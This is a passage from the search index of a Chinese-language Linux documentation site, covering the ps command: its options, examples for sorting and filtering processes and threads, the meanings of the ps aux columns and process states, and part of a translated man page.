\u663e\u793a\u6240\u6709\u7ec8\u7aef\u673a\u4e0b\u6267\u884c\u7684\u7a0b\u5e8f\uff0c\u9664\u4e86\u9636\u6bb5\u4f5c\u4e1a\u9886\u5bfc\u8005\u4e4b\u5916 a \u663e\u793a\u73b0\u884c\u7ec8\u7aef\u673a\u4e0b\u7684\u6240\u6709\u7a0b\u5e8f\uff0c\u5305\u62ec\u5176\u4ed6\u7528\u6237\u7684\u7a0b\u5e8f -A \u663e\u793a\u6240\u6709\u7a0b\u5e8f -c \u663e\u793aCLS\u548cPRI\u680f\u4f4d c \u5217\u51fa\u7a0b\u5e8f\u65f6\uff0c\u663e\u793a\u6bcf\u4e2a\u7a0b\u5e8f\u771f\u6b63\u7684\u6307\u4ee4\u540d\u79f0\uff0c\u800c\u4e0d\u5305\u542b\u8def\u5f84\uff0c\u9009\u9879\u6216\u5e38\u9a7b\u670d\u52a1\u7684\u6807\u793a -C <\u6307\u4ee4\u540d\u79f0> \u6307\u5b9a\u6267\u884c\u6307\u4ee4\u7684\u540d\u79f0\uff0c\u5e76\u5217\u51fa\u8be5\u6307\u4ee4\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5 -d \u663e\u793a\u6240\u6709\u7a0b\u5e8f\uff0c\u4f46\u4e0d\u5305\u62ec\u9636\u6bb5\u4f5c\u4e1a\u9886\u5bfc\u8005\u7684\u7a0b\u5e8f -e \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201dA\u201d\u9009\u9879\u76f8\u540c e \u5217\u51fa\u7a0b\u5e8f\u65f6\uff0c\u663e\u793a\u6bcf\u4e2a\u7a0b\u5e8f\u6240\u4f7f\u7528\u7684\u73af\u5883\u53d8\u91cf -f \u5b8c\u6574\u683c\u5f0f\u5217\u8868\u3002\u4e0e-L\u4e00\u8d77\u4f7f\u7528\u65f6\uff0c\u5c06\u6dfb\u52a0NLWP\uff08\u7ebf\u7a0b\u6570\uff09\u548cLWP\uff08\u7ebf\u7a0bID\uff09\u5217 f \u7528ASCII\u5b57\u7b26\u663e\u793a\u6811\u72b6\u7ed3\u6784\uff0c\u8868\u8fbe\u7a0b\u5e8f\u95f4\u7684\u76f8\u4e92\u5173\u7cfb -F \u989d\u5916\u5b8c\u6574\u683c\u5f0f -g <\u7fa4\u7ec4\u540d\u79f0> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-G\u201d\u9009\u9879\u76f8\u540c\uff0c\u5f53\u4ea6\u80fd\u4f7f\u7528\u9636\u6bb5\u4f5c\u4e1a\u9886\u5bfc\u8005\u7684\u540d\u79f0\u6765\u6307\u5b9a g \u663e\u793a\u73b0\u884c\u7ec8\u7aef\u673a\u4e0b\u7684\u6240\u6709\u7a0b\u5e8f\uff0c\u5305\u62ec\u7fa4\u7ec4\u9886\u5bfc\u8005\u7684\u7a0b\u5e8f -G <\u7fa4\u7ec4\u8bc6\u522b\u7801> \u5217\u51fa\u5c5e\u4e8e\u8be5\u7fa4\u7ec4\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5\uff0c\u4e5f\u53ef\u4f7f\u7528\u7fa4\u7ec4\u540d\u79f0\u6765\u6307\u5b9a h \u4e0d\u663e\u793a\u6807\u9898\u5217 -H \u663e\u793a\u6811\u72b6\u7ed3\u6784\uff0c\u8868\u793a\u7a0b\u5e8f\u95f4\u7684\u76f8\u4e92\u5173\u7cfb -j\u6216j \u91c7\u7528\u5de5\u4f5c\u63a7\u5236\u7684\u683c\u5f0f\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 -l\u6216l \u5c0f\u5199L \u56e0\u4e3aps\u6ca1\u6709-i\u6216\u8005-\u5927\u5199i\u9009\u9879 \u91c7\u7528\u8be6\u7ec6\u7684\u683c\u5f0f\u6765\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 -L \u663e\u793a\u7ebf\u7a0b L \u5217\u51fa\u680f\u4f4d\u7684\u76f8\u5173\u4fe1\u606f -m\u6216m \u663e\u793a\u6240\u6709\u7684\u6267\u884c\u7eea n \u4ee5\u6570\u5b57\u6765\u8868\u793aUSER\u548cWCHAN\u680f\u4f4d -N \u663e\u793a\u6240\u6709\u7684\u7a0b\u5e8f\uff0c\u9664\u4e86\u6267\u884cps\u6307\u4ee4\u7ec8\u7aef\u673a\u4e0b\u7684\u7a0b\u5e8f\u4e4b\u5916 -p <\u7a0b\u5e8f\u8bc6\u522b\u7801> \u6307\u5b9a\u7a0b\u5e8f\u8bc6\u522b\u7801\uff0c\u5e76\u5217\u51fa\u8be5\u7a0b\u5e8f\u7684\u72b6\u51b5 p <\u7a0b\u5e8f\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-p\u201d\u9009\u9879\u76f8\u540c\uff0c\u53ea\u5728\u5217\u8868\u683c\u5f0f\u65b9\u9762\u7a0d\u6709\u5dee\u5f02 r \u53ea\u5217\u51fa\u73b0\u884c\u7ec8\u7aef\u673a\u6b63\u5728\u6267\u884c\u4e2d\u7684\u7a0b\u5e8f -s <\u9636\u6bb5\u4f5c\u4e1a> \u6307\u5b9a\u9636\u6bb5\u4f5c\u4e1a\u7684\u7a0b\u5e8f\u8bc6\u522b\u7801\uff0c\u5e76\u5217\u51fa\u96b6\u5c5e\u8be5\u9636\u6bb5\u4f5c\u4e1a\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5 s \u91c7\u7528\u7a0b\u5e8f\u4fe1\u53f7\u7684\u683c\u5f0f\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 S \u5217\u51fa\u7a0b\u5e8f\u65f6\uff0c\u5305\u62ec\u5df2\u4e2d\u65ad\u7684\u5b50\u7a0b\u5e8f\u8d44\u6599 o \u6307\u5b9a\u7528\u6237\u5b9a\u4e49\u7684\u683c\u5f0f\u3002\u4e0e-o\u548c--format\u76f8\u540c\u3002 -t <\u7ec8\u7aef\u673a\u7f16\u53f7> \u6307\u5b9a\u7ec8\u7aef\u673a\u7f16\u53f7\uff0c\u5e76\u5217\u51fa\u5c5e\u4e8e\u8be5\u7ec8\u7aef\u673a\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5 t <\u7ec8\u7aef\u673a\u7f16\u53f7> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-t\u201d\u9009\u9879\u76f8\u540c\uff0c\u53ea\u5728\u5217\u8868\u683c\u5f0f\u65b9\u9762\u7a0d\u6709\u5dee\u5f02 -T \u663e\u793a\u73b0\u884c\u7ec8\u7aef\u673a\u4e0b\u7684\u6240\u6709\u7a0b\u5e8f -u <\u7528\u6237\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-U\u201d\u9009\u9879\u76f8\u540c u \u4ee5\u7528\u6237\u4e3a\u4e3b\u7684\u683c\u5f0f\u6765\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 -U <\u7528\u6237\u8bc6\u522b\u7801> \u5217\u51fa\u5c5e\u4e8e\u8be5\u7528\u6237\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5\uff0c\u4e5f\u53ef\u4f7f\u7528\u7528\u6237\u540d\u79f0\u6765\u6307\u5b9a U <\u7528\u6237\u540d\u79f0> \u5217\u51fa\u5c5e\u4e8e\u8be5\u7528\u6237\u7684\u7a0b\u5e8f\u7684\u72b6\u51b5 v \u91c7\u7528\u865a\u62df\u5185\u5b58\u7684\u683c\u5f0f\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 -V\u6216V \u663e\u793a\u7248\u672c\u4fe1\u606f -w\u6216w \u91c7\u7528\u5bbd\u9614\u7684\u683c\u5f0f\u6765\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 x \u663e\u793a\u6240\u6709\u7a0b\u5e8f\uff0c\u4e0d\u4ee5\u7ec8\u7aef\u673a\u6765\u533a\u5206 X \u91c7\u7528\u65e7\u5f0f\u7684Linux i386\u767b\u9646\u683c\u5f0f\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5 -y \u914d\u5408\u9009\u9879\u201d-l\u201d\u4f7f\u7528\u65f6\uff0c\u4e0d\u663e\u793aF(flag)\u680f\u4f4d\uff0c\u5e76\u4ee5RSS\u680f\u4f4d\u53d6\u4ee3ADDR\u680f\u4f4d -- <\u7a0b\u5e8f\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201dp\u201d\u9009\u9879\u76f8\u540c --cols <\u6bcf\u5217\u5b57\u7b26\u6570> \u8bbe\u7f6e\u6bcf\u5217\u7684\u6700\u5927\u5b57\u7b26\u6570 --columns <\u6bcf\u5217\u5b57\u7b26\u6570> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d--cols\u201d\u9009\u9879\u76f8\u540c --cumulative \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201dS\u201d\u9009\u9879\u76f8\u540c --deselect \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-N\u201d\u9009\u9879\u76f8\u540c --forest \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201df\u201d\u9009\u9879\u76f8\u540c --headers \u91cd\u590d\u663e\u793a\u6807\u9898\u5217 --help \u5728\u7ebf\u5e2e\u52a9 --info \u663e\u793a\u6392\u9519\u4fe1\u606f --lines <\u663e\u793a\u5217\u6570> \u8bbe\u7f6e\u663e\u793a\u753b\u9762\u7684\u5217\u6570 --no-headers \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201dh\u201d\u9009\u9879\u76f8\u540c\uff0c\u53ea\u5728\u5217\u8868\u683c\u5f0f\u65b9\u9762\u7a0d\u6709\u5dee\u5f02 --group <\u7fa4\u7ec4\u540d\u79f0> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-G\u201d\u9009\u9879\u76f8\u540c --Group <\u7fa4\u7ec4\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-G\u201d\u9009\u9879\u76f8\u540c --pid <\u7a0b\u5e8f\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-p\u201d\u9009\u9879\u76f8\u540c --rows <\u663e\u793a\u5217\u6570> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d--lines\u201d\u9009\u9879\u76f8\u540c --sid <\u9636\u6bb5\u4f5c\u4e1a> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-s\u201d\u9009\u9879\u76f8\u540c -tty <\u7ec8\u7aef\u673a\u7f16\u53f7> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-t\u201d\u9009\u9879\u76f8\u540c --user <\u7528\u6237\u540d\u79f0> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-U\u201d\u9009\u9879\u76f8\u540c --User <\u7528\u6237\u8bc6\u522b\u7801> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-U\u201d\u9009\u9879\u76f8\u540c --version \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-V\u201d\u9009\u9879\u76f8\u540c --widty <\u6bcf\u5217\u5b57\u7b26\u6570> \u6b64\u9009\u9879\u7684\u6548\u679c\u548c\u6307\u5b9a\u201d-cols\u201d\u9009\u9879\u76f8\u540c","title":"\u5e38\u7528\u53c2\u6570\uff1a\ufeff"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/ps/#rd","text":"$ ps -e -L h o state,pid,ppid,ucmd:30,cmd:100,wchan:30 |awk '{if($1==\"R\"||$1==\"D\"){print $0}}'","title":"\u53ea\u6253\u5370R\u548cD\u72b6\u6001\u7684\u7ebf\u7a0b"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/ps/#rd_1","text":"$ ps -e -L h o state,pid,ppid,ucmd:30,cmd:100,wchan:30 |awk '{if($1==\"R\"||$1==\"D\"){print $0}}' | sort | uniq -c","title":"\u53ea\u6253\u5370R\u548cD\u72b6\u6001\u7684\u7ebf\u7a0b\u5e76\u6309\u7167\u7ebf\u7a0b\u6570\u91cf\u6392\u5e8f"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/ps/#_2","text":"$ ps -ALFlf #\u8fd9\u91cc\u662f\u5c0f\u5199L,ps\u6ca1\u6709-i\u6216\u8005-\u5927\u5199i\u9009\u9879 \u6253\u5370\u7ebf\u7a0b\u5360\u7528CPU\u6392\u5e8f $ ps -Leo pid,tid,class,rtprio,ni,pri,psr,pcpu,stat,wchan:30,comm | grep -v COMMAND | sort -k8nr","title":"\u6253\u5370\u6240\u6709\u7ebf\u7a0b"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/ps/#ps-aux","text":"ps a \u663e\u793a\u73b0\u884c\u7ec8\u7aef\u673a\u4e0b\u7684\u6240\u6709\u7a0b\u5e8f\uff0c\u5305\u62ec\u5176\u4ed6\u7528\u6237\u7684\u7a0b\u5e8f\u3002 ps u \u3000 \u4ee5\u7528\u6237\u4e3a\u4e3b\u7684\u683c\u5f0f\u6765\u663e\u793a\u7a0b\u5e8f\u72b6\u51b5\u3002 ps x \u3000 \u663e\u793a\u6240\u6709\u7a0b\u5e8f\uff0c\u4e0d\u4ee5\u7ec8\u7aef\u673a\u6765\u533a\u5206\u3002 [root@tianyun ~]# ps aux |less USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND root 1 0.0 0.0 2164 648 ? Ss 08:47 0:00 init [5] \uff1f\u8868\u793a\u4e0d\u662f\u7ec8\u7aef\u542f\u52a8\u7684\u800c\u662f\u5185\u6838\u542f\u52a8\u7684\u8fdb\u7a0b USER: \u8fd0\u884c\u8fdb\u7a0b\u7684\u7528\u6237 PID\uff1a \u8fdb\u7a0bID %CPU: CPU\u5360\u7528\u7387 //1\u5206\u949f\u5360\u7528\u7387 %MEM: \u5185\u5b58\u5360\u7528\u7387 VSZ\uff1a \u5360\u7528\u865a\u62df\u5185\u5b58 RSS: \u5360\u7528\u5b9e\u9645\u5185\u5b58 \u9a7b\u7559\u5185\u5b58 TTY\uff1a \u8fdb\u7a0b\u8fd0\u884c\u7684\u7ec8\u7aef STAT\uff1a \u8fdb\u7a0b\u72b6\u6001 man ps (/STATE) START: \u8fdb\u7a0b\u7684\u542f\u52a8\u65f6\u95f4 TIME\uff1a \u8fdb\u7a0b\u5360\u7528CPU\u7684\u603b\u65f6\u95f4 COMMAND\uff1a \u8fdb\u7a0b\u6587\u4ef6\uff0c\u8fdb\u7a0b\u540d","title":"ps aux\u7684\u89e3\u91ca"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/ps/#stat","text":"R \u662f Running \u6216 Runnable \u7684\u7f29\u5199\uff0c\u8868\u793a\u8fdb\u7a0b\u5728 CPU \u7684\u5c31\u7eea\u961f\u5217\u4e2d\uff0c\u6b63\u5728\u8fd0\u884c\u6216\u8005\u6b63\u5728\u7b49\u5f85\u8fd0\u884c\u3002 S \u662f Interruptible Sleep \u7684\u7f29\u5199\uff0c\u4e5f\u5c31\u662f\u53ef\u4e2d\u65ad\u72b6\u6001\u7761\u7720\uff0c\u8868\u793a\u8fdb\u7a0b\u56e0\u4e3a\u7b49\u5f85\u67d0\u4e2a\u4e8b\u4ef6\u800c\u88ab\u7cfb\u7edf\u6302\u8d77\u3002\u5f53\u8fdb\u7a0b\u7b49\u5f85\u7684\u4e8b\u4ef6\u53d1\u751f\u65f6\uff0c\u5b83\u4f1a\u88ab\u5524\u9192\u5e76\u8fdb\u5165 R \u72b6\u6001\u3002 D \u662f Disk Sleep \u7684\u7f29\u5199\uff0c\u4e5f\u5c31\u662f\u4e0d\u53ef\u4e2d\u65ad\u72b6\u6001\u7761\u7720\uff08Uninterruptible Sleep\uff09\uff0c\u4e00\u822c\u8868\u793a\u8fdb\u7a0b\u6b63\u5728\u8ddf\u786c\u4ef6\u4ea4\u4e92\uff0c\u5e76\u4e14\u4ea4\u4e92\u8fc7\u7a0b\u4e0d\u5141\u8bb8\u88ab\u5176\u4ed6\u8fdb\u7a0b\u6216\u4e2d\u65ad\u6253\u65ad\u3002 T \u8868\u793a\u8fdb\u7a0b\u5904\u4e8e\u6682\u505c\u6216\u8005\u8ddf\u8e2a\u72b6\u6001\u3002\u5411\u4e00\u4e2a\u8fdb\u7a0b\u53d1\u9001 SIGSTOP \u4fe1\u53f7\uff0c\u5b83\u5c31\u4f1a\u56e0\u54cd\u5e94\u8fd9\u4e2a\u4fe1\u53f7\u53d8\u6210\u6682\u505c\u72b6\u6001\uff08Stopped\uff09\uff1b\u518d\u5411\u5b83\u53d1\u9001 SIGCONT \u4fe1\u53f7\uff0c\u8fdb\u7a0b\u53c8\u4f1a\u6062\u590d\u8fd0\u884c\uff08\u5982\u679c\u8fdb\u7a0b\u662f\u7ec8\u7aef\u91cc\u76f4\u63a5\u542f\u52a8\u7684\uff0c\u5219\u9700\u8981\u4f60\u7528 fg \u547d\u4ee4\uff0c\u6062\u590d\u5230\u524d\u53f0\u8fd0\u884c\uff09\u3002 Z \u662f Zombie \u7684\u7f29\u5199\uff0c\u5982\u679c\u4f60\u73a9\u8fc7\u201c\u690d\u7269\u5927\u6218\u50f5\u5c38\u201d\u8fd9\u6b3e\u6e38\u620f\uff0c\u5e94\u8be5\u77e5\u9053\u5b83\u7684\u610f\u601d\u3002\u5b83\u8868\u793a\u50f5\u5c38\u8fdb\u7a0b\uff0c\u4e5f\u5c31\u662f\u8fdb\u7a0b\u5b9e\u9645\u4e0a\u5df2\u7ecf\u7ed3\u675f\u4e86\uff0c\u4f46\u662f\u7236\u8fdb\u7a0b\u8fd8\u6ca1\u6709\u56de\u6536\u5b83\u7684\u8d44\u6e90\uff08\u6bd4\u5982\u8fdb\u7a0b\u7684\u63cf\u8ff0\u7b26\u3001PID \u7b49\uff09\u3002 //\u4e0d\u80fd\u6709\u592a\u591a\uff0c\u6709\u592a\u591a\u5c31\u4e0d\u6b63\u5e38\u7684 I \u662f Idle \u7684\u7f29\u5199\uff0c\u4e5f\u5c31\u662f\u7a7a\u95f2\u72b6\u6001\uff0c\u7528\u5728\u4e0d\u53ef\u4e2d\u65ad\u7761\u7720\u7684\u5185\u6838\u7ebf\u7a0b\u4e0a\u3002\u524d\u9762\u8bf4\u4e86\uff0c\u786c\u4ef6\u4ea4\u4e92\u5bfc\u81f4\u7684\u4e0d\u53ef\u4e2d\u65ad\u8fdb\u7a0b\u7528 D \u8868\u793a\uff0c\u4f46\u5bf9\u67d0\u4e9b\u5185\u6838\u7ebf\u7a0b\u6765\u8bf4\uff0c\u5b83\u4eec\u6709\u53ef\u80fd\u5b9e\u9645\u4e0a\u5e76\u6ca1\u6709\u4efb\u4f55\u8d1f\u8f7d\uff0c\u7528 Idle \u6b63\u662f\u4e3a\u4e86\u533a\u5206\u8fd9\u79cd\u60c5\u51b5\u3002\u8981\u6ce8\u610f\uff0cD \u72b6\u6001\u7684\u8fdb\u7a0b\u4f1a\u5bfc\u81f4\u5e73\u5747\u8d1f\u8f7d\u5347\u9ad8\uff0c I \u72b6\u6001\u7684\u8fdb\u7a0b\u5374\u4e0d\u4f1a\u3002 X \u6b7b\u6389\u7684\u8fdb\u7a0b Ss s\u8fdb\u7a0b\u7684\u9886\u5bfc\u8005\uff0c\u7236\u8fdb\u7a0b S< <\u4f18\u5148\u7ea7\u8f83\u9ad8\u7684\u8fdb\u7a0b SN N\u4f18\u5148\u7ea7\u8f83\u4f4e\u7684\u8fdb\u7a0b R+ +\u8868\u793a\u662f\u524d\u53f0\u7684\u8fdb\u7a0b\u7ec4 Sl \u4ee5\u7ebf\u7a0b\u7684\u65b9\u5f0f\u8fd0\u884c","title":"stat\u7684\u5404\u79cd\u72b6\u6001\u542b\u4e49"},{"location":"system/linux/%E8%AE%A1%E7%AE%97/ps/#_3","text":"\u81ea\u5b9a\u4e49\u683c\u5f0f\u6392\u5e8f $ ps -eo pid,user,args --sort user \u6309\u7167\u6807\u9898\u8fdb\u884c\u6392\u5e8f\uff08\u5df2\u5931\u6548\uff0c\u539f\u56e0\u53c2\u89c1\u4e0b\u9762\u7684man\u624b\u518c\u4e2d\u6587\u7ffb\u8bd1\uff09 $ ps aux --sort %cpu //\u4ece\u4f4e\u5f80\u9ad8\u6392\u5e8f $ ps aux --sort -%cpu //\u4ece\u9ad8\u5f80\u4f4e\u6392\u5e8f $ ps aux --sort rss $ ps aux --sort -rss $ ps aux --sort %mem $ ps aux --sort -%mem \u624b\u52a8\u6392\u5e8f \u4f7f\u7528\u5185\u5b58\u524d10 $ ps aux | sort -k4nr | head -n 10 \u4f7f\u7528CPU\u524d10 $ ps aux | sort -k3nr | head -n 10 Note \u6bd4\u5982\u8bf4sort -k 1 -k 2 test.txt\uff0c\u90a3\u4e48\u5c31\u4f1a\u6839\u636etest.txt\u6587\u4ef6\u4e2d\u7684\u7b2c\u4e00\u5217\u548c\u7b2c\u4e8c\u5217\u8fdb\u884c\u6392\u5e8f\u3002 -n\uff1a\u4f9d\u7167\u6570\u503c\u7684\u5927\u5c0f\u6392\u5e8f\uff1b -r\uff1a\u4ee5\u76f8\u53cd\u7684\u987a\u5e8f\u6765\u6392\u5e8f PS(1) \u7528\u6237\u547d\u4ee4 PS(1) \u540d\u79f0 ps - \u62a5\u544a\u5f53\u524d\u8fdb\u7a0b\u7684\u5feb\u7167\u3002 \u6982\u8981 ps [\u9009\u9879] \u63cf\u8ff0 ps \u663e\u793a\u9009\u5b9a\u7684\u6d3b\u52a8\u8fdb\u7a0b\u7684\u4fe1\u606f\u3002\u5982\u679c\u60a8\u5e0c\u671b\u5bf9\u9009\u5b9a\u7684\u4fe1\u606f\u8fdb\u884c\u91cd\u590d\u66f4\u65b0\uff0c\u8bf7\u4f7f\u7528 top\u3002 \u8be5\u7248\u672c\u7684 ps \u63a5\u53d7\u51e0\u79cd\u7c7b\u578b\u7684\u9009\u9879\uff1a 1 UNIX \u9009\u9879\uff0c\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528\uff0c\u5e76\u4e14\u5fc5\u987b\u4ee5\u7834\u6298\u53f7\u4e3a\u524d\u7f00\u3002 2 BSD \u9009\u9879\uff0c\u53ef\u4ee5\u7ec4\u5408\u4f7f\u7528\uff0c\u4e0d\u5e94\u4f7f\u7528\u7834\u6298\u53f7\u3002 3 GNU \u957f\u9009\u9879\uff0c\u4ee5\u4e24\u4e2a\u7834\u6298\u53f7\u4e3a\u524d\u7f00\u3002 \u53ef\u4ee5\u81ea\u7531\u6df7\u5408\u4f7f\u7528\u4e0d\u540c\u7c7b\u578b\u7684\u9009\u9879\uff0c\u4f46\u53ef\u80fd\u4f1a\u51fa\u73b0\u51b2\u7a81\u3002\u7531\u4e8e\u6b64 ps \u517c\u5bb9\u591a\u4e2a\u6807\u51c6\u548c ps \u5b9e\u73b0\uff0c \u56e0\u6b64\u5b58\u5728\u4e00\u4e9b\u529f\u80fd\u4e0a\u76f8\u540c\u7684\u540c\u4e49\u9009\u9879\u3002 \u8bf7\u6ce8\u610f\uff0cps -aux \u4e0e ps aux \u662f\u4e0d\u540c\u7684\u3002POSIX \u548c UNIX \u6807\u51c6\u8981\u6c42 ps -aux \u6253\u5370\u51fa\u6240\u6709\u7531\u540d\u4e3a x \u7684\u7528\u6237\u62e5\u6709\u7684\u8fdb\u7a0b\uff0c\u4ee5\u53ca\u6240\u6709\u7531 -a \u9009\u9879\u9009\u62e9\u7684\u8fdb\u7a0b\u3002\u5982\u679c\u7528\u6237 x \u4e0d\u5b58\u5728\uff0c\u5219\u6b64 ps \u53ef\u80fd\u4f1a\u5c06 \u547d\u4ee4\u89e3\u91ca\u4e3a ps aux\uff0c\u5e76\u6253\u5370\u8b66\u544a\u3002\u6b64\u884c\u4e3a\u65e8\u5728\u5e2e\u52a9\u8fc7\u6e21\u65e7\u811a\u672c\u548c\u4e60\u60ef\u3002\u5b83\u662f\u8106\u5f31\u7684\uff0c\u53ef\u80fd\u4f1a \u66f4\u6539\uff0c\u56e0\u6b64\u4e0d\u5e94\u4f9d\u8d56\u6b64\u884c\u4e3a\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cps \u9009\u62e9\u6240\u6709\u4e0e\u5f53\u524d\u7528\u6237\u62e5\u6709\u76f8\u540c\u6709\u6548\u7528\u6237 ID (euid=EUID) \u5e76\u4e0e\u8c03\u7528\u8005\u5173\u8054\u7684 \u7ec8\u7aef\u76f8\u5173\u8054\u7684\u8fdb\u7a0b\u3002\u5b83\u663e\u793a\u8fdb\u7a0b ID (pid=PID)\uff0c\u4e0e\u8fdb\u7a0b\u5173\u8054\u7684\u7ec8\u7aef (tname=TTY)\uff0c\u4ee5 [DD-]hh:mm:ss \u683c\u5f0f\u7d2f\u8ba1\u7684 CPU \u65f6\u95f4 (time=TIME) \u548c\u53ef\u6267\u884c\u6587\u4ef6\u540d (ucmd=CMD)\u3002\u8f93\u51fa\u9ed8\u8ba4 \u60c5\u51b5\u4e0b\u672a\u6392\u5e8f\u3002 \u4f7f\u7528 BSD \u98ce\u683c\u7684\u9009\u9879\u5c06\u6dfb\u52a0\u8fdb\u7a0b\u72b6\u6001 (stat=STAT) \u5230\u9ed8\u8ba4\u663e\u793a\uff0c\u5e76\u663e\u793a\u547d\u4ee4\u53c2\u6570 (args=COMMAND) \u800c\u4e0d\u662f\u53ef\u6267\u884c\u6587\u4ef6\u540d\u3002\u60a8\u53ef\u4ee5\u901a\u8fc7 PS_FORMAT \u73af\u5883\u53d8\u91cf\u8986\u76d6\u6b64\u8bbe\u7f6e\u3002\u4f7f\u7528 BSD \u98ce\u683c\u7684\u9009\u9879\u8fd8\u5c06 \u66f4\u6539\u8fdb\u7a0b\u9009\u62e9\uff0c\u4ee5\u5305\u62ec\u7531\u60a8\u62e5\u6709\u7684\u5176\u4ed6\u7ec8\u7aef (TTYs) \u4e0a\u7684\u8fdb\u7a0b\uff1b\u6216\u8005\uff0c\u53ef\u4ee5\u5c06\u5176\u63cf\u8ff0\u4e3a\u5c06\u9009\u62e9 \u8bbe\u7f6e\u4e3a\u6240\u6709\u8fdb\u7a0b\u7684\u96c6\u5408\uff0c\u8fc7\u6ee4\u6389\u7531\u5176\u4ed6\u7528\u6237\u62e5\u6709\u7684\u8fdb\u7a0b\u6216\u4e0d\u5728\u7ec8\u7aef\u4e0a\u7684\u8fdb\u7a0b\u3002\u8fd9\u4e9b\u6548\u679c\u5728\u4e0b\u6587 \u63cf\u8ff0\u9009\u9879\u65f6\u4e0d\u88ab\u89c6\u4e3a\u201c\u76f8\u540c\u201d\uff0c\u56e0\u6b64 -M \u5c06\u88ab\u89c6\u4e3a\u4e0e Z \u7b49\u6548\u3002 \u9664\u4e0b\u6587\u6240\u8ff0\u5916\uff0c\u8fdb\u7a0b\u9009\u62e9\u9009\u9879\u662f\u7d2f\u52a0\u7684\u3002\u9ed8\u8ba4\u9009\u62e9\u88ab\u4e22\u5f03\uff0c\u7136\u540e\u5c06\u9009\u5b9a\u7684\u8fdb\u7a0b\u6dfb\u52a0\u5230\u8981\u663e\u793a\u7684 \u8fdb\u7a0b\u96c6\u4e2d\u3002\u56e0\u6b64\uff0c\u5982\u679c\u4e00\u4e2a\u8fdb\u7a0b\u7b26\u5408\u4efb\u4f55\u7ed9\u5b9a\u7684\u9009\u62e9\u6807\u51c6\uff0c\u5b83\u5c06\u88ab\u663e\u793a\u3002 \u793a\u4f8b \u4f7f\u7528\u6807\u51c6\u8bed\u6cd5\u67e5\u770b\u7cfb\u7edf\u4e0a\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff1a ps -e ps -ef ps -eF ps -ely \u4f7f\u7528 BSD \u8bed\u6cd5\u67e5\u770b\u7cfb\u7edf\u4e0a\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff1a ps ax ps axu \u6253\u5370\u8fdb\u7a0b\u6811\uff1a ps -ejH ps axjf \u83b7\u53d6\u7ebf\u7a0b\u4fe1\u606f\uff1a ps -eLf ps axms \u83b7\u53d6\u5b89\u5168\u4fe1\u606f\uff1a ps -eo euser,ruser,suser,fuser,f,comm,label ps axZ ps -eM \u4ee5\u7528\u6237\u683c\u5f0f\u67e5\u770b\u4ee5 root (\u771f\u5b9e\u548c\u6709\u6548 ID) \u8fd0\u884c\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff1a ps -U root -u root u \u67e5\u770b\u5177\u6709\u7528\u6237\u5b9a\u4e49\u683c\u5f0f\u7684\u6bcf\u4e2a\u8fdb\u7a0b\uff1a ps -eo pid,tid,class,rtprio,ni,pri,psr,pcpu,stat,wchan:14,comm ps axo stat,euid,ruid,tty,tpgid,sess,pgrp,ppid,pid,pcpu,comm ps -Ao pid,tt,user,fname,tmout,f,wchan \u4ec5\u6253\u5370 syslogd \u7684\u8fdb\u7a0b ID\uff1a ps -C syslogd -o pid= \u4ec5\u6253\u5370 PID 42 \u7684\u540d\u79f0\uff1a ps -q 42 -o comm= \u7b80\u5355\u7684\u8fdb\u7a0b\u9009\u62e9 a \u89e3\u9664 BSD \u98ce\u683c\u7684\u201c\u4ec5\u4f60\u81ea\u5df1\u201d\u9650\u5236\uff0c\u8be5\u9650\u5236\u5728\u4f7f\u7528\u67d0\u4e9b BSD \u98ce\u683c\uff08\u4e0d\u5e26\u201c-\u201d\uff09\u9009\u9879\u6216 ps \u4e2a\u6027\u8bbe\u7f6e\u4e3a BSD 